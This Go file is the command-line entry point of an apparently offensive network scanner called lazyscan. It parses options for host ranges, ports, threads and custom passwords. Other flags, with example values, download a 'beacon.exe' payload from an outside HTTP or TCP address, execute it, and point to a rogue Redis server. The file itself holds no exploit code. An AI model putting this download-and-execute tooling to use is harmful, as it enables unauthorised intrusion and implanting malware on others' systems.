package main

import (
	"flag"

	"github.com/404tk/lazyscan/common"
	"github.com/404tk/lazyscan/runner"
)

func parseOptions() *runner.Options {
	options := &runner.Options{}
	flag.StringVar(&options.Host, "h", "", "IP address or cidr")
	flag.StringVar(&options.HostFile, "hf", "", "host file, -hf ip.txt")
	flag.StringVar(&options.Ports, "p", common.DefaultPorts, "Select a port")
	flag.BoolVar(&options.NoPing, "np", false, "not to ping")
	flag.StringVar(&options.Scantype, "m", "all", "Select scan type ,as: -m etcd")
	flag.Int64Var(&options.Timeout, "time", 3, "Set timeout")
	flag.IntVar(&options.Threads, "t", 600, "Thread nums")
	flag.IntVar(&options.LiveTop, "top", 10, "show live len top")
	flag.StringVar(&options.Password, "pwd", "", "custom password")
	flag.StringVar(&options.HTTPDownloadAddr, "ha", "", "download address, -ha http://192.168.1.2:8080/beacon.exe")
	flag.StringVar(&options.TCPDownloadAddr, "ta", "", "download address, -ta 192.168.1.2:8553/beacon.exe")
	flag.StringVar(&options.FileName, "f", "", "temp filename, -f beacon.exe")
	flag.StringVar(&options.ExecCommand, "e", "", "exec command, -e beacon.exe")
	flag.StringVar(&options.RedisRogueServer, "rs", "", "redis rogue server, -rs 192.168.1.2:6380")
	flag.Parse()

	return options
}

func main() {
	options := parseOptions()
	runner := runner.New(options)
	runner.Enumerate(nil)
}
